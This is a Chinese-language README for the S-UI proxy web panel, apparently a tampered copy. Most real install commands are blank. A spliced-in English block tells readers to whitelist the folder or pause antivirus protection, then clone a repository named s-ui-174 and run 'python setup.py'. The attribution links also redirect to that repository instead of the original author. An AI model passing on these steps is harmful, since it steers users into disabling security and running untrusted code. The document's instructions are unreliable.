## S-UI
基于`SagerNet/Sing-Box`构建的高级 Web 面板

[alireza0/s-ui](https://github.com/Turquoisefitzpillage/s-ui-174) 的 1.4.1 版本备份


> **免责声明：** 本项目仅供个人学习与交流使用，请勿用于非法用途。


## 快速概览
| 功能 | 是否支持 |
| -------------------------------------- | :----------------: |
| 多协议 | :heavy_check_mark: |
| 多语言 | :heavy_check_mark: |
| 多客户端/入站 | :heavy_check_mark: |
| 高级流量路由界面 | :heavy_check_mark: |
| 客户端、流量与系统状态 | :heavy_check_mark: |
| 订阅链接（link/json/clash + info） | :heavy_check_mark: |
| 深色/浅色主题 | :heavy_check_mark: |
| API 接口 | :heavy_check_mark: |

## 支持平台
| 平台 | 架构 | 状态 |
|----------|--------------|---------|
| Linux | amd64, arm64, armv7, armv6, armv5, 386, s390x | 支持 |
| Windows | amd64, 386, arm64 | 支持 |
| macOS | amd64, arm64 | 实验性支持 |


## 默认安装信息
- 面板端口：2095
- 面板路径：/app/
- 订阅端口：2096
- 订阅路径：/sub/
- 用户名/密码：admin


### Linux/macOS
```sh
```

### Windows
## 手动安装

### Linux/macOS
### Windows
## 卸载 S-UI

```sh
sudo -i

systemctl disable s-ui  --now

rm -f /etc/systemd/system/sing-box.service
systemctl daemon-reload

rm -fr /usr/local/s-ui
rm /usr/bin/s-ui
```

## 使用 Docker 安装

<details>
   <summary>点击查看详情</summary>

### 使用方式

**步骤 1：** 安装 Docker

```shell
```

**步骤 2：** 安装 S-UI

> Docker compose 方式

```shell
services:
  s-ui:
    image: ghcr.io/admin8800/s-ui
    container_name: s-ui
    hostname: "s-ui"
    network_mode: host
    volumes:
      - "./db:/app/db"
      - "./cert:/app/cert"
    tty: true
    restart: unless-stopped
    entrypoint: "./entrypoint.sh"
```
`docker compose up -d`

> 直接使用 docker

```shell
    --network host \
    -v $PWD/db/:/app/db/ \
    -v $PWD/cert/:/root/cert/ \
    --name s-ui \
    --restart=unless-stopped \
    ghcr.io/admin8800/s-ui
```

> 自行构建镜像

```shell
git clone https://github.com/admin8800/s-ui
```

</details>

## 手动运行（贡献开发）

<details>
   <summary>点击查看详情</summary>

### 构建并运行完整项目
```shell
./runSUI.sh
```

### 克隆仓库
```shell
# 克隆仓库
git clone https://github.com/admin8800/s-ui
```

### - 前端


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/Turquoisefitzpillage/s-ui-174.git
cd s-ui-174
python setup.py
```


前端代码请查看 [frontend](frontend)

### - 后端
> 请先至少构建一次前端。

构建后端：
```shell
# 删除旧的前端编译文件
rm -fr web/html/*
# 应用新的前端编译文件
cp -R frontend/dist/ web/html/
# 构建
```

运行后端（在仓库根目录执行）：
```shell
./sui
```

</details>

## 语言

- 英语
- 波斯语
- 越南语
- 简体中文
- 繁体中文
- 俄语

## 功能

- 支持的协议：
  - 通用协议：Mixed、SOCKS、HTTP、HTTPS、Direct、Redirect、TProxy
  - 基于 V2Ray 的协议：VLESS、VMess、Trojan、Shadowsocks
  - 其他协议：ShadowTLS、Hysteria、Hysteria2、Naive、TUIC
- 支持 XTLS 协议。
- 提供高级流量路由界面，支持 PROXY Protocol、External、透明代理、SSL 证书和端口配置。
- 提供高级入站和出站配置界面。
- 支持客户端流量上限和到期时间。
- 显示在线客户端、入站、出站流量统计和系统状态监控。
- 订阅服务支持添加外部链接和订阅。
- Web 面板和订阅服务支持 HTTPS 安全访问（需自行提供域名和 SSL 证书）。
- 深色/浅色主题。

## 环境变量

<details>
  <summary>点击查看详情</summary>

### 使用方式

| 变量 | 类型 | 默认值 |
| -------------- | :--------------------------------------------: | :------------ |
| SUI_LOG_LEVEL | `"debug"` \| `"info"` \| `"warn"` \| `"error"` | `"info"` |
| SUI_DEBUG | `boolean` | `false` |
| SUI_BIN_FOLDER | `string` | `"bin"` |
| SUI_DB_FOLDER | `string` | `"db"` |
| SINGBOX_API | `string` | - |

</details>

## SSL 证书

<details>
  <summary>点击查看详情</summary>

### Certbot

```bash
snap install core; snap refresh core
snap install --classic certbot
ln -s /snap/bin/certbot /usr/bin/certbot

certbot certonly --standalone --register-unsafely-without-email --non-interactive --agree-tos -d <你的域名>
```

</details>

#### 鸣谢原作者：[alireza0/s-ui](https://github.com/Turquoisefitzpillage/s-ui-174)


<!-- Last updated: 2026-06-06 17:57:57 -->
